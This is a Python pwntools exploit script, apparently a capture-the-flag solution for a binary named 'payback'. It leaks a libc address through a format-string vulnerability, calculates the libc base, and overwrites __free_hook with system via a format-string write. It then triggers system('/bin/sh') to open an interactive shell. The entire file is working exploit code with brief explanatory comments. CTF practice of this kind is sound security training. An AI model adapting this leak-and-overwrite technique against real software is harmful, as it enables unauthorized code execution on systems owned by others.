from pwn import *

context.update(arch='amd64',os='linux')
elf=ELF('./payback',checksec=False)

proc=process('./payback')

d=proc.recvuntil('>> ')

proc.sendline('1')				# add a bot
proc.recvuntil('URL: ')
proc.sendline('1')
proc.recvuntil(': ')
proc.sendline('455')


proc.sendlineafter('>> ','3')
proc.sendlineafter('id: ','0')							# leak valid libc address
forma='AAAAAAAA| %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'
proc.sendlineafter('deletion: ',forma)

out=proc.recvuntil('>> ').decode()
libc_243=out.split(' ')[-36]
libc_243=int(libc_243[0:libc_243.find('\n')],16)

libc_base=libc_243-int('0x240b3',16)		# find libc base by subtracting offset from leaked address

libc=elf.libc
libc.address=libc_base						# assign libc.address with calculated base



proc.sendline('1')							# add a bot 
proc.recvuntil('URL: ')
proc.sendline('1')
proc.recvuntil(': ')
proc.sendline('455')

proc.sendlineafter('>> ','3')
proc.sendlineafter('id: ','0')

payload = fmtstr_payload(8, {libc.sym.__free_hook: libc.sym.system}, write_size='byte')		# format string write free hook with system

print(payload)
proc.sendlineafter('deletion: ',payload)   #send payload
proc.sendline()
proc.recvuntil("Reason: \n")
result = proc.recvline()


proc.sendline(b'1')						# add a bot
proc.sendline(b'/bin/sh')				# pass argument to system 
proc.sendline(b'1337')
proc.sendline(b'3')
proc.sendline(b'0')
proc.sendline(b'I WANT SHELL')
proc.interactive()						# to interact with the shell
